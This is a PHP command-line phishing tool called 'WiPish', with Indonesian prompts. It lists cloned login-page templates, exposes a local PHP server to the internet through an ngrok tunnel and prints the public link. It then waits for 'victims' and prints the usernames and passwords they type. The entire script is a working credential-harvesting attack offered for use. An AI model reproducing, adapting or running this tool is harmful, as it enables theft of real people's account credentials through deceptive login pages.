<?php

echo "
_________ _______ _________ _______  _______  _______ 
|\     /|\__   __/(       )\__   __/(  ____ \(  ____ \(  ____ \
| )   ( |   ) (   | () () |   ) (   | (    \/| (    \/| (    \/
| | _ | |   | |   | || || |   | |   | (_____ | (__    | |      
| |( )| |   | |   | |(_)| |   | |   (_____  )|  __)   | |      
| || || |   | |   | |   | |   | |         ) || (      | |      
| () () |___) (___| )   ( |___) (___/\____) || (____/\| (____/\
(_______)\_______/|/     \|\_______/\_______)(_______/(_______/

\n";
echo "Pishing Tools WiPish \nCreted By MasTenWap\n\n";



$directory = scandir('sites');
$directory =  array_diff($directory, array('.', '..'));
$no=2;
while($no <=33)
{
 if($no==2){$tab="\t";}else{$tab="\t\t\t";}
 if($no==12){$tab="\t\t";}else{$tab="\t\t\t";}
 echo $no.".".$directory[$no]."$tab";
 $no = $no+1;
 echo $no.".".$directory[$no]."\n";
 $no = $no+1;
}

echo "Masukan Nomor : ";
$sites = trim(fgets(STDIN));
echo "\n\nRunning Server 20 Detik\n\n";
$directory = $directory[$sites];
exec("./ngrok http 1337 > /dev/null 2>&1 &");
sleep(20);
echo "Link Server : \n";
echo exec("curl -s localhost:4040/api/tunnels | jq -r .tunnels\[0\].public_url")."\n";
shell_exec("cd sites/$directory/ && php -S localhost:1337 > /dev/null 2>&1 &");

if(file_exists("sites/$directory/usernames.txt"))
{
shell_exec("cd sites/$directory/ && rm -rf usernames.txt");
fopen("sites/$directory/usernames.txt", "w");
}else{
fopen("sites/$directory/usernames.txt", "w");
}

sleep(5);


echo "\n\nMenunggu Korban .... \n\n";

while(true)
{
$count = 0;
$myFile = "sites/$directory/usernames.txt";
$fh = fopen($myFile, 'r');
while(!feof($fh)){
    $fr = fread($fh, 8192);
    $count += substr_count($fr, 'Pass:');
}
fclose($fh);
if($count > 0)
{echo "Korban Terperangkap : \n"; echo exec("cat sites/$directory/usernames.txt"); echo "\n\n";break;}
}

?>
